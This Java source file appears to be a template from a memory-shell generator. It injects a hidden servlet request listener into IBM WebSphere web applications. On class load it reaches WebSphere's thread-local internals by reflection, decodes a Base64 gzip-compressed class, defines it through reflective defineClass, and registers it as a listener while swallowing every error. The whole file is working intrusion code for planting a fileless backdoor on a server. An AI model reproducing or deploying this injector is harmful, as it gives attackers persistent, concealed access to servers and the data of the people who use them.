package jmg.core.template;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.GZIPInputStream;

public class WebSphereListenerInjectorTpl {

    public String getClassName() {
        return "";
    }

    public String getBase64String() throws IOException {
        return "";
    }

    static {
        new WebSphereListenerInjectorTpl();
    }


    public WebSphereListenerInjectorTpl() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object listener = getListener(context);
                addListener(context, listener);
            }
        } catch (Exception ignored) {

        }

    }

    public List<Object> getContext() throws Exception {
        List<Object> contexts = new ArrayList<Object>();
        Object context;
        Object obj = getFV(Thread.currentThread(), "wsThreadLocals");
        Object[] wsThreadLocals = (Object[]) obj;
        for (Object wsThreadLocal : wsThreadLocals) {
            obj = wsThreadLocal;
            // for websphere 7.x
            if (obj != null && obj.getClass().getName().endsWith("FastStack")) {
                Object[] stackList = (Object[]) getFV(obj, "stack");
                for (Object stack : stackList) {
                    try {
                        Object config = getFV(stack, "config");
                        context = getFV(getFV(config, "context"), "context");
                        contexts.add(context);
                    } catch (Exception ignored) {
                    }
                }
            } else if (obj != null && obj.getClass().getName().endsWith("WebContainerRequestState")) {
                context = getFV(getFV(getFV(getFV(getFV(obj, "currentThreadsIExtendedRequest"), "_dispatchContext"), "_webapp"), "facade"), "context");
                contexts.add(context);
            }
        }
        return contexts;
    }

    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            return ((ClassLoader) getFV(context, "loader"));
        }
    }

    private Object getListener(Object context) throws Exception {
        Object listener = null;
        ClassLoader classLoader = getWebAppClassLoader(context);
        try {
            listener = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class listenerClass = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                listener = listenerClass.newInstance();
            } catch (Throwable ignored) {
            }
        }
        return listener;
    }

    public void addListener(Object context, Object listener) throws Exception {
        List listeners = (List) getFV(context, "servletRequestListeners");
        // 判断是否已经存在
        if (!listeners.contains(listener)) listeners.add(listener);
    }

    public static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }


    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    private static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj.getClass(), fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    private static Field getF(Class<?> clazz, String fieldName) throws NoSuchFieldException {
        try {
            while (clazz != null) {
                try {
                    Field field = clazz.getDeclaredField(fieldName);
                    field.setAccessible(true);
                    return field;
                } catch (NoSuchFieldException e) {
                    clazz = clazz.getSuperclass();
                }
            }
        }catch (Exception ignored){
        }
        return null;
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }
}
